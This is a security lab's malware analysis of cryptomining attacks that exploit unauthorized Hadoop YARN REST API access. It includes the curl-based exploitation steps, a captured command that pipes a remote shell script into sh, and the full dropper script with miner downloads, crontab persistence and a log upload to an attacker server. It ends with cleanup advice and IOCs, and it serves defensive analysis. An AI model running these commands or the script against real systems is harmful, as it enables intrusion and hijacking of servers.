作者：Fooying@云鼎实验室  
公众号：[云鼎实验室](https://mp.weixin.qq.com/s/fF6a5Yhl5y6eSVskYtYSvw "云鼎实验室")

#### 一、背景

5月5日腾讯云安全团队曾针对攻击者利用Hadoop Yarn资源管理系统REST
API未授权漏洞对服务器进行攻击，攻击者可以在未授权的情况下远程执行代码的安全问题进行预警，在预警的前后我们曾多次捕获相关的攻击案例，其中就包含利用该问题进行挖矿，我们针对其中一个案例进行分析并提供响应的安全建议和解决方案。

#### 二、漏洞说明

Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。简单的说，用户可以向YARN提交特定应用程序进行执行，其中就允许执行相关包含系统命令。

YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST
API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。

###### 攻击步骤：

1.申请新的application

直接通过curl进行POST请求

    
    
    curl -v -X POST 'http://ip:8088/ws/v1/cluster/apps/new-application'

返回内容类似于：

    
    
    {"application-id":"application_1527144634877_20465","maximum-resource-capability":{"memory":16384,"vCores":8}}  

2.构造并提交任务

构造json文件1.json，内容如下，其中application-id对应上面得到的id，命令内容为尝试在/var/tmp目录下创建`11112222_test_111122222`文件，内容也为111：

    
    
    {  
        "am-container-spec":{  
            "commands":{  
                "command":"echo '111' > /var/tmp/11112222_test_11112222"
    
            }  
        },  
        "application-id":"application_1527144634877_20465",  
        "application-name":"test",  
        "application-type":"YARN"  
    }  

然后直接

    
    
    curl -s -i -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' http://ip:8088/ws/v1/cluster/apps --data-binary @1.json

即可完成攻击，命令被执行，在相应目录下可以看到生成了对应文件

![](https://images.seebug.org/content/images/2018/06/3bbdb209-d7cb-4393-aef3-516d056708b4.png-w331s)

更多漏洞详情可以参考 <http://bbs.qcloud.com/thread-50090-1-1.html>

#### 三、入侵分析

在本次分析的案例中，受害机器部署有Hadoop YARN，并且存在未授权访问的安全问题，黑客直接利用开放在8088的REST
API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的。

![](https://images.seebug.org/content/images/2018/06/be6e17a9-48b8-45ff-8a48-c6394823a1c7.png-w331s)

整个利用过程相对比较简单，通过捕捉Hadoop 的`launch_container.sh`执行脚本，我们可以看到其中一个案例中相关任务执行的命令：

    
    
    1.#!/bin/bash  
    2.  
    3.export LOCAL_DIRS="/root/hadoop/tmp/nm-local-dir/usercache/dr.who/appcache/application_1527144634877_20417"  
    4.export APPLICATION_WEB_PROXY_BASE="/proxy/application_1527144634877_20417"  
    5....这里省略部分内容  
    6.export CONTAINER_ID="container_1527144634877_20417_02_000001"  
    7.export MALLOC_ARENA_MAX="4"  
    8.exec /bin/bash -c "curl 185.222.210.59/x_wcr.sh | sh & disown"  
    9.hadoop_shell_errorcode=$?  
    10.if [ $hadoop_shell_errorcode -ne 0 ]  
    11.then  
    12.  exit $hadoop_shell_errorcode  
    13.fi  

可以很明显的看到第8行位置，从185.222.210.59下载并执行了一个名为x_wcr.sh的脚本。

在实际过程中，我们从多个案例捕获了多个比如名为cr.sh的不同脚本，但实际的功能代码都差不多，我们对其中一个`x_wcr.sh`脚本进行分析，代码自上而下内容：

    
    
    1.pkill -f cryptonight  
    2.pkill -f sustes  
    3.pkill -f xmrig  
    4.pkill -f xmr-stak  
    5.pkill -f suppoie  
    6.ps ax | grep "config.json -t" | grep -v grep | awk '{print $1}' | xargs kill -9  
    7.ps ax | grep 'wc.conf\|wq.conf\|wm.conf\|wt.conf' | grep -v grep | grep 'ppl\|pscf\|ppc\|ppp' | awk '{print $1}' | xargs kill -9  
    8.rm -rf /var/tmp/pscf*  
    9.rm -rf /tmp/pscf*  

这部分代码主要针对已存在的挖矿进程、文件进行清理。

    
    
    1.DIR="/tmp"
    2.if [ -a "/tmp/java" ]  
    3.then  
    4.    if [ -w "/tmp/java" ] && [ ! -d "/tmp/java" ]  
    5.    then  
    6.        if [ -x "$(command -v md5sum)" ]  
    7.        then  
    8.            sum=$(md5sum /tmp/java | awk '{ print $1 }')  
    9.            echo $sum  
    10.            case $sum in  
    11.                183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    12.                    echo "Java OK"  
    13.                ;;  
    14.                *)  
    15.                    echo "Java wrong"  
    16.                    pkill -f w.conf  
    17.                    sleep 4  
    18.                ;;  
    19.            esac  
    20.        fi  
    21.        echo "P OK"  
    22.    else  
    23.        DIR=$(mktemp -d)/tmp  
    24.        mkdir $DIR  
    25.        echo "T DIR $DIR"  
    26.    fi  
    27.else  
    28.    if [ -d "/var/tmp" ]  
    29.    then  
    30.        DIR="/var/tmp"  
    31.    fi  
    32.    echo "P NOT EXISTS"  
    33.fi  

这部分的代码主要是判断如果/tmp/java是一个存在并且可写的文件，那么就判断其MD5值是否匹配，MD5不匹配则根据w.conf关键词查找并kill进程；如果非可写的文件，则重新赋值DIR变量，这个变量主要用于后面部分代码中下载挖矿等程序存放目录。

    
    
    1.if [ -d "/tmp/java" ]  
    2.then  
    3.    DIR=$(mktemp -d)/tmp  
    4.    mkdir $DIR  
    5.    echo "T DIR $DIR"  
    6.fi  
    7.WGET="wget -O"  
    8.if [ -s /usr/bin/curl ];  
    9.then  
    10.    WGET="curl -o";  
    11.fi  
    12.if [ -s /usr/bin/wget ];  
    13.then  
    14.    WGET="wget -O";  
    15.fi  
    16.f2="185.222.210.59"  

然后接着是一些变量的赋值，包括再次判断如果/tmp/java是一个目录，则重新赋值DIR变量；判断curl和wget命令是否存在，存在则赋值到WGET变量；f2则是赋值为某个IP，实则为是后续下载相关文件的服务器之一。

    
    
    1.if [ ! "$(ps -fe|grep '/tmp/java'|grep 'w.conf'|grep -v grep)" ];  
    2.then  
    3.    downloadIfNeed  
    4.    chmod +x $DIR/java  
    5.    $WGET $DIR/w.conf http://$f2/w.conf  
    6.    nohup $DIR/java -c $DIR/w.conf > /dev/null 2>&1 &  
    7.    sleep 5  
    8.    rm -rf $DIR/w.conf  
    9.else  
    10.    echo "Running"  
    11.fi  
    12.if crontab -l | grep -q "185.222.210.59"  
    13.then  
    14.    echo "Cron exists"  
    15.else  
    16.    echo "Cron not found"  
    17.    LDR="wget -q -O -"  
    18.    if [ -s /usr/bin/curl ];  
    19.    then  
    20.        LDR="curl";  
    21.    fi  
    22.    if [ -s /usr/bin/wget ];  
    23.    then  
    24.        LDR="wget -q -O -";  
    25.    fi  
    26.    (crontab -l 2>/dev/null; echo "* * * * * $LDR http://185.222.210.59/cr.sh | sh > /dev/null 2>&1")| crontab -  
    27.fi  

这部分代码是其中比较核心的代码，通过downloadIfNeed方法下载挖矿程序到`$DIR`目录下并重命名为java，下载w.conf配置文件，给挖矿程序增加执行权限，然后以nohup命令后台运行挖矿程序并删除配置文件；接着检查crontab中的任务，如果不存在对应的任务，就将下载执行脚本的任务`"*
* * * * $LDR http://185.222.210.59/cr.sh | sh > /dev/null
2>&1"`添加到其中,这里`$LDR`为wget -q -O -或者curl，任务每分钟执行一次。

脚本中还包含了几个嵌套调用的download方法，入口方法是downloadIfNeed：

    
    
    1.downloadIfNeed()  
    2.{  
    3.    if [ -x "$(command -v md5sum)" ]  
    4.    then  
    5.        if [ ! -f $DIR/java ]; then  
    6.            echo "File not found!"  
    7.            download  
    8.        fi  
    9.        sum=$(md5sum $DIR/java | awk '{ print $1 }')  
    10.        echo $sum  
    11.        case $sum in  
    12.            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    13.                echo "Java OK"  
    14.            ;;  
    15.            *)  
    16.                echo "Java wrong"  
    17.                sizeBefore=$(du $DIR/java)  
    18.                if [ -s /usr/bin/curl ];  
    19.                then  
    20.                    WGET="curl -k -o ";  
    21.                fi  
    22.                if [ -s /usr/bin/wget ];  
    23.                then  
    24.                    WGET="wget --no-check-certificate -O ";  
    25.                fi  
    26.                echo "" > $DIR/tmp.txt  
    27.                rm -rf $DIR/java  
    28.                download  
    29.  
    30.                if [ -x "$(command -v md5sum)" ]  
    31.                then  
    32.                    sum=$(md5sum $DIR/java | awk '{ print $1 }')  
    33.                    echo $sum  
    34.                    case $sum in  
    35.                        183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    36.                            echo "Java OK"  
    37.                            cp $DIR/java $DIR/ppc  
    38.                        ;;  
    39.                        *)  
    40.                            $WGET $DIR/java https://transfer.sh/WoGXx/zzz > $DIR/tmp.txt 2>&1  
    41.                            echo "Java wrong"  
    42.                            sum=$(md5sum $DIR/java | awk '{ print $1 }')  
    43.                            case $sum in  
    44.                                183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    45.                                    echo "Java OK"  
    46.                                    cp $DIR/java $DIR/ppc  
    47.                                ;;  
    48.                                *)  
    49.                                    echo "Java wrong2"  
    50.                                ;;  
    51.                            esac  
    52.                        ;;  
    53.                    esac  
    54.                else  
    55.                    echo "No md5sum"  
    56.                fi  
    57.  
    58.                sumAfter=$(md5sum $DIR/java | awk '{ print $1 }')  
    59.                if [ -s /usr/bin/curl ];  
    60.                then  
    61.                    echo "redownloaded $sum $sizeBefore after $sumAfter " `du $DIR/java` >> $DIR/tmp.txt  
    62.                    curl -F "file=@$DIR/tmp.txt" http://$f2/re.php  
    63.                fi  
    64.            ;;  
    65.        esac  
    66.    else  
    67.        echo "No md5sum"  
    68.        download  
    69.    fi  
    70.}  

这个方法的核心功能还是校验已存在的挖矿程序的MD5，如果无法验证或者文件不存在的情况，则直接调用download方法下载挖矿程序；如果文件存在但MD5匹配不正确，则调用download方法后再次验证，验证失败则尝试从另外一个下载渠道<https://transfer.sh/WoGXx/zzz>下载挖矿程序并再次验证。最后还将相关结果上报到目标服务器$f2的re.php.

tmp.txt内容示例：

![](https://images.seebug.org/content/images/2018/06/f224a66c-d2c2-417a-8481-1ea7dbc7bad7.png-w331s)

    
    
    1.download() {  
    2.    if [ -x "$(command -v md5sum)" ]  
    3.    then  
    4.        sum=$(md5sum $DIR/ppc | awk '{ print $1 }')  
    5.        echo $sum  
    6.        case $sum in  
    7.            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    8.                echo "Java OK"  
    9.                cp $DIR/ppc $DIR/java  
    10.            ;;  
    11.            *)  
    12.                echo "Java wrong"  
    13.                download2  
    14.            ;;  
    15.        esac  
    16.    else  
    17.        echo "No md5sum"  
    18.        download2  
    19.    fi  
    20.}  

download方法判断ppc文件的存在与否和 MD5是否匹配，如果不存在或MD5不匹配则调用download2下载，如果存在则复制重名为java。

    
    
    1.download2() {  
    2.    f1=$(curl 185.222.210.59/g.php)  
    3.    if [ -z "$f1" ];  
    4.    then  
    5.        f1=$(wget -q -O - 185.222.210.59/g.php)  
    6.    fi  
    7.  
    8.    if [ `getconf LONG_BIT` = "64" ]  
    9.    then  
    10.        $WGET $DIR/java http://$f1/xm64?$RANDOM  
    11.    else  
    12.        $WGET $DIR/java http://$f1/xm32?$RANDOM  
    13.    fi  
    14.  
    15.    if [ -x "$(command -v md5sum)" ]  
    16.    then  
    17.        sum=$(md5sum $DIR/java | awk '{ print $1 }')  
    18.        echo $sum  
    19.        case $sum in  
    20.            183664ceb9c4d7179d5345249f1ee0c4 | b00f4bbd82d2f5ec7c8152625684f853)  
    21.                echo "Java OK"  
    22.                cp $DIR/java $DIR/ppc  
    23.            ;;  
    24.            *)  
    25.                echo "Java wrong"  
    26.            ;;  
    27.        esac  
    28.    else  
    29.        echo "No md5sum"  
    30.    fi  
    31.}  

download2方法则判断系统下载对应版本的挖矿程序，其中<http://185.222.210.59/g.php>返回的是另外一个IP地址；下载成功后则再次验证，并复制重命名为ppc。

    
    
    1.pkill -f logo4.jpg  
    2.pkill -f logo0.jpg  
    3.pkill -f logo9.jpg  
    4.pkill -f jvs  
    5.pkill -f javs  
    6.pkill -f 192.99.142.248  
    7.rm -rf /tmp/pscd*  
    8.rm -rf /var/tmp/pscd*  
    9.crontab -l | sed '/192.99.142.232/d' | crontab -  
    10.crontab -l | sed '/192.99.142.226/d' | crontab -  
    11.crontab -l | sed '/192.99.142.248/d' | crontab -  
    12.crontab -l | sed '/logo4/d' | crontab -  
    13.crontab -l | sed '/logo9/d' | crontab -  
    14.crontab -l | sed '/logo0/d' | crontab -  

在脚本的最后部分还有一些进程、文件、crontab清理的处理，用pkill删除满足条件的进程，删除tmp目录下pscd开头的文件，以及说删除crontab中存在某些关键词的任务。

至此，我们完成整个脚本的分析，虽然整个脚本比较冗长，而且似乎各个函数嵌套调用，涉及文件也众多，但其实整体就做了以下几件事：

  1. 清理相关的进程、文件和crontab任务
  2. 判断并下载挖矿程序，同时校验MD5值，除了黑客自己控制的服务器，还利用<https://transfer.sh>提供备用下载，多种方式保障
  3. 增加脚本下载执行任务添加到crontab里

其实，我们通过查看YARN的日志文件`yarn-root-nodemanager-master.hadoop.log`也可能看到相应的痕迹：

![](https://images.seebug.org/content/images/2018/06/93602699-b14d-4e68-b9ec-4491ad08a0b6.png-w331s)
![](https://images.seebug.org/content/images/2018/06/e81b0c8c-f961-4140-8bf4-523b2e89f70f.png-w331s)

或者我们通过管理UI查看application详情：

![](https://images.seebug.org/content/images/2018/06/3241d083-5db1-4c74-8446-055693f963a9.png-w331s)

而crontab的任务日志也能看到相关的执行记录：

![](https://images.seebug.org/content/images/2018/06/4b0cc89c-6740-4979-ad43-6a93b4956e39.png-w331s)

最终在/var/tmp目录下也能找到相关的文件

![](https://images.seebug.org/content/images/2018/06/673c831c-130a-4094-9791-6d7217fafb88.png-w331s)

#### 四、安全建议

###### 清理病毒

  1. 使用top查看进程，kill掉异常进程
  2. 检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件
  3. 检查crontab任务列表，删除异常任务
  4. 排查YARN日志，确认异常的application，删除处理

###### 安全加固

  1. 通过iptables或者安全组配置访问策略，限制对8088等端口的访问
  2. 如无必要，不要将接口开放在公网，改为本地或者内网调用
  3. 升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问
  4. 云镜当前已支持该漏洞检测，同时也支持挖矿木马的发现，建议安装云镜并开通专业版，及时发现漏洞并修复或者在中马后能及时收到提醒进行止损
  5. 更多自检和修复建议可以参考 <http://bbs.qcloud.com/thread-50090-1-1.html>

#### 五、IOCs

###### 钱包地址

4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg

###### MD5

  1. c8c1f2da51fbd0aea60e11a81236c9dc
  2. 183664ceb9c4d7179d5345249f1ee0c4
  3. b00f4bbd82d2f5ec7c8152625684f853

###### 矿池地址

  1. 158.69.133.20:3333
  2. 192.99.142.249:3333
  3. 202.144.193.110:3333
  4. 46.30.43.159:80

###### 部分相关URL

  1. <http://185.222.210.59/x_wcr.sh>
  2. <http://185.222.210.59/re.php>
  3. <http://185.222.210.59/g.php>
  4. <http://185.222.210.59/w.conf>
  5. <http://185.222.210.59/cr.sh>
  6. <http://192.99.142.226:8220/w.conf>
  7. <http://192.99.142.226:8220/xm64>
  8. <http://192.99.142.226:8220/cr.sh>
  9. <http://95.142.40.83/xm64>
  10. <http://95.142.40.83/xm32>
  11. <https://transfer.sh/1o3Kj/zzz>
  12. <https://transfer.sh/wbl5H/pscf>
  13. <https://transfer.sh/WoGXx/zzz>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/611/>

